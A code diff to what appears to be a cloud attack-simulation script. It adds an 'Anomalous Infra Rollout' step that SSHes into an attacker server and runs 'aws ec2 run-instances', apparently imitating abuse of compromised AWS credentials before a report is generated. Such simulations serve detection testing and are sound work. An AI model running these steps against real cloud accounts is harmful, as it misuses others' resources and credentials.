@@ -81,6 +81,9 @@ def scenario_execute():
     WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]
     ATTACKER_SERVER_INSTANCE_ID = data["Attacker Server Instance ID"]
     WEB_SERVER_INSTANCE_ID = data["Web Server Instance ID"]
+    SUBNET_ID = data["Subnet ID"]
+    AMI_ID = data["AMI ID"]
+    KEY_PAIR_NAME = data["Key Pair Name"]
 
     print("Web Server Public IP: ", WEB_SERVER_PUBLIC_IP)
 
@@ -102,6 +105,14 @@ def scenario_execute():
     loading_animation()
     subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)
 
+    print("-"*30)
+    print(colored("Anomalous Infra Rollout", color="red"))
+    loading_animation()
+    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" ""aws ec2 run-instances --image-id "+AMI_ID+" --instance-type t2.micro --key-name "+KEY_PAIR_NAME+"  --subnet-id "+SUBNET_ID+" --region ap-south-1 | jq '.Instances[].InstanceId'""", shell=True)
+
+    print("-"*30)
+    print(colored("Generating Report", color="red"))
+    loading_animation()
     gen_report(ATTACKER_SERVER_INSTANCE_ID, ATTACKER_SERVER_PUBLIC_IP, WEB_SERVER_PUBLIC_IP, WEB_SERVER_INSTANCE_ID)
 
 
